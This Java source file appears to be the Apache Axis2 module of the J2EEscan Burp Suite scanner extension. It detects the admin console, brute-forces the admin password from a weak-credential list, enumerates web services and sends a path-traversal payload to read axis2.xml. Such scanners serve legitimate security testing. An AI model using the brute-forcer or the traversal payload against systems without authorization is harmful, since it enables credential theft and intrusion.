package burp.j2ee.issues.impl;

import burp.CustomHttpRequestResponse;
import burp.HTTPMatcher;
import static burp.HTTPMatcher.getMatches;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IResponseInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.WeakPassword;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;

public class ApacheAxis implements IModule {

    // List of host and port system already tested
    private static LinkedHashSet hs = new LinkedHashSet();

    private static final String TITLE_AXIS_SERVICES = "Apache Axis2 - Web Service Enumeration";
    private static final String DESCRIPTION_AXIS_SERVICES = "J2EEscan identified "
            + "the Apache Axis2 console. It was possible to enumerate the registered "
            + "Web Services";

    private static final String TITLE_AXIS_ADMIN_CONSOLE = "Apache Axis2 - Admin Console";
    private static final String DESCRIPTION_AXIS_ADMIN_CONSOLE = "J2EEscan identified "
            + "the Apache Axis2 administration console";

    private static final String TITLE_AXIS_ADMIN_CONSOLE_WEAK_PWD = "Apache Axis2 - Admin Console Weak Password";
    private static final String DESCRIPTION_AXIS_ADMIN_CONSOLE_WEAK_PWD = "J2EEscan identified "
            + "a common/default administration password for Apache Axis2 admin console. It's possible to "
            + "deploy new malicious web services and execute remote commands on the target.";

    private static final String TITLE_AXIS_LFI = "Apache Axis2 - Local File Include Vulnerability";
    private static final String DESCRIPTION_AXIS_LFI = "J2EEscan identified "
            + "a Local File Include Vulnerability. It was possible to retrieve configuration files"
            + "(web.xml, axis2.xml) under the <i>WEB-INF</i> directory; this issue allows to retrieve"
            + " the password for the Axis2 admin panel, and other sensitive properties.<br /><br/>"
            + "<b>References</b>:<br /><br />"
            + "https://issues.apache.org/jira/browse/AXIS2-4279<br />"
            + "http://osvdb.org/59001<br />";

    private static final List<String> AXIS_PATHS = Arrays.asList(
            "/axis2/",
            "/dswsbobje/" //SAP BusinessObjects path
    );

    private static final String AXIS_SERVICES_PATH = "/services/listServices";
    private static final String AXIS_ADMIN_PATH = "/axis2-admin/";

    private static final byte[] GREP_STRING_AXIS_SERVICE_PAGE = "<title>List Services</title>".getBytes();
    private static final byte[] GREP_STRING_AXIS_XML = "<axisconfig".getBytes();
    private static final byte[] GREP_STRING_AXIS_ADMIN = "<title>Login to Axis2 :: Administration".getBytes();
    private static final byte[] GREP_STRING_AXIS_ADMIN_WEAK_PWD = "You are now logged into the Axis2 administration console".getBytes();

    private static final String LFI_PAYLOAD = "?xsd=../conf/axis2.xml";

    private PrintWriter stderr;
    private PrintWriter stdout;

    private String axisAdminBruteforcer(URL url, IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse) {
        List<Map.Entry<String, String>> credentials;
        credentials = WeakPassword.getCredentials();

        List<String> listOfPwd = new ArrayList<>();
        for (Map.Entry<String, String> credential : credentials) {
            listOfPwd.add(credential.getValue());
        }
        // Add default axis2  credentials
        listOfPwd.add("axis2");

        // Remove duplicated password
        // The default admininistrator account is "admin"
        HashSet cr = new HashSet();
        cr.addAll(listOfPwd);
        listOfPwd.clear();
        listOfPwd.addAll(cr);

        String body;
        String user;
        String pwd;
        IExtensionHelpers helpers = callbacks.getHelpers();
        List<String> headers = new ArrayList<>();
        headers.add("POST /" + url.getPath() + "login HTTP/1.1");
        headers.add("Host: " + url.getHost() + ":" + url.getPort());
        headers.add("Content-Type: application/x-www-form-urlencoded");
        headers.add("Cookie: JSESSIONID=RRFBD58CDF88C10F4EFC47066FFF69A9");

        for (String pwdToTest : listOfPwd) {

            // Admin user is fixed
            body = "userName=admin&password=" + pwdToTest + "&submit=+Login+";

            byte[] loginMessage = helpers.buildHttpMessage(headers, body.getBytes());

            IHttpRequestResponse resp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), loginMessage);

            // look for matches of our active check grep string in the response body
            byte[] httpResponse = resp.getResponse();
            List<int[]> matches = getMatches(httpResponse, GREP_STRING_AXIS_ADMIN_WEAK_PWD, helpers);
            if (matches.size() > 0) {
                return pwdToTest;
            }
        }

        return null;
    }

    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        List<IScanIssue> issues = new ArrayList<>();

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);
        stdout = new PrintWriter(callbacks.getStderr(), true);

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();
        String host = url.getHost();
        int port = url.getPort();

        String system = host.concat(Integer.toString(port));

        // System not yet tested for this vulnerability
        if (!hs.contains(system)) {

            hs.add(system);

            String protocol = url.getProtocol();
            Boolean isSSL = (protocol.equals("https"));

            for (String AXIS_PATH : AXIS_PATHS) {

                try {

                    // Test for administration console 
                    URL axisAdminUrlToTest = new URL(protocol, url.getHost(), url.getPort(),
                            AXIS_PATH + AXIS_ADMIN_PATH);

                    byte[] axisAdminTest = helpers.buildHttpRequest(axisAdminUrlToTest);

                    byte[] axisAdminResponse = callbacks.makeHttpRequest(url.getHost(),
                            url.getPort(), isSSL, axisAdminTest);

                    IResponseInfo axisAdminInfo = helpers.analyzeResponse(axisAdminResponse);

                    if (axisAdminInfo.getStatusCode() == 200) {

                        String adminResp = helpers.bytesToString(axisAdminResponse);
                        String adminRespBody = adminResp.substring(axisAdminInfo.getBodyOffset());

                        // look for matches of our active check grep string
                        List<int[]> matcheAdminAxisLogin = getMatches(helpers.stringToBytes(adminRespBody),
                                GREP_STRING_AXIS_ADMIN, helpers);

                        if ((matcheAdminAxisLogin.size() > 0)) {
                            stdout.println("Axis2 Admin Console detected " + axisAdminUrlToTest.toString());

                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    axisAdminUrlToTest,
                                    new CustomHttpRequestResponse(axisAdminTest, axisAdminResponse, baseRequestResponse.getHttpService()),
                                    TITLE_AXIS_ADMIN_CONSOLE,
                                    DESCRIPTION_AXIS_ADMIN_CONSOLE,
                                    "Restrict access to the management console only from trusted hosts/networks",
                                    Risk.Low,
                                    Confidence.Certain
                            ));
                        }

                        stdout.println("Weak Password tests will be executed on " + axisAdminUrlToTest.toString());

                        String result = axisAdminBruteforcer(axisAdminUrlToTest, callbacks, baseRequestResponse);

                        if (result != null) {
                            String pwdDetail = "<br /><br />The password for the admin account is <b>" + result + "</b><br /><br /";
                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    axisAdminUrlToTest,
                                    new CustomHttpRequestResponse(axisAdminTest, axisAdminResponse, baseRequestResponse.getHttpService()),
                                    TITLE_AXIS_ADMIN_CONSOLE_WEAK_PWD,
                                    DESCRIPTION_AXIS_ADMIN_CONSOLE_WEAK_PWD + pwdDetail,
                                    "Change the weak password and restrict access to the management console only from trusted hosts/networks",
                                    Risk.High,
                                    Confidence.Certain));
                        }

                    }
                    // End axis2 administration console

                    // Enumerate the remote web services
                    URL urlToTest = new URL(protocol, url.getHost(), url.getPort(), AXIS_PATH + AXIS_SERVICES_PATH);
                    byte[] axistest = helpers.buildHttpRequest(urlToTest);

                    byte[] response = callbacks.makeHttpRequest(url.getHost(),
                            url.getPort(), isSSL, axistest);

                    IResponseInfo axisInfo = helpers.analyzeResponse(response);

                    if (axisInfo.getStatusCode() == 200) {

                        String resp = helpers.bytesToString(response);
                        String respBody = resp.substring(axisInfo.getBodyOffset());

                        // look for matches of our active check grep string
                        List<int[]> matcheAxis = getMatches(helpers.stringToBytes(respBody),
                                GREP_STRING_AXIS_SERVICE_PAGE, helpers);

                        if ((matcheAxis.size() > 0)) {

                            // Retrieve the list of web services
                            List<String> wsNames = HTTPMatcher.getServicesFromAxis(respBody);

                            String wsListDescription = "";

                            if (wsNames.size() > 0) {
                                wsListDescription = "<br />The registered Web Services are:<br/><ul>";
                                for (String wsName : wsNames) {
                                    wsListDescription += "<li><b>" + wsName + "</b></li>";
                                }
                                wsListDescription += "</ul><br />";
                            }

                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    new URL(protocol, url.getHost(), url.getPort(), AXIS_PATH),
                                    new CustomHttpRequestResponse(axistest, response, baseRequestResponse.getHttpService()),
                                    TITLE_AXIS_SERVICES,
                                    DESCRIPTION_AXIS_SERVICES + wsListDescription,
                                    "Restrict access to the web service list resource",
                                    Risk.Low,
                                    Confidence.Certain
                            ));

                            // Test for Directory Traversal issue
                            if (wsNames.isEmpty()) {
                                stdout.println("No Registered Web Services, skipping LFI vulnerability test");
                                break;
                            }

                            String axisURIPATHLFI = AXIS_PATH + "/services/" + wsNames.get(0) + LFI_PAYLOAD;
                            URL axisURLLFI = new URL(protocol, url.getHost(), url.getPort(), axisURIPATHLFI);

                            byte[] axisLFITest = helpers.buildHttpRequest(axisURLLFI);

                            byte[] LFIResponse = callbacks.makeHttpRequest(url.getHost(),
                                    url.getPort(), isSSL, axisLFITest);

                            IResponseInfo axisLFIInfo = helpers.analyzeResponse(LFIResponse);

                            if (axisLFIInfo.getStatusCode() == 200) {

                                String lfiResp = helpers.bytesToString(LFIResponse);
                                String lfiRespBody = lfiResp.substring(axisLFIInfo.getBodyOffset());

                                // look for matches of our active check grep string
                                List<int[]> matchLFIAxis = getMatches(helpers.stringToBytes(lfiRespBody),
                                        GREP_STRING_AXIS_XML, helpers);

                                if ((matchLFIAxis.size() > 0)) {
                                    issues.add(new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            axisURLLFI,
                                            new CustomHttpRequestResponse(axisLFITest, LFIResponse, baseRequestResponse.getHttpService()),
                                            TITLE_AXIS_LFI,
                                            DESCRIPTION_AXIS_LFI,
                                            "Update the Apache Axis component with the last stable release",
                                            Risk.High,
                                            Confidence.Certain
                                    ));
                                }
                            }
                        }
                    }

                } catch (MalformedURLException ex) {
                    stderr.println("Malformed URL Exception " + ex);
                }
            }
        }

        return issues;
    }

}
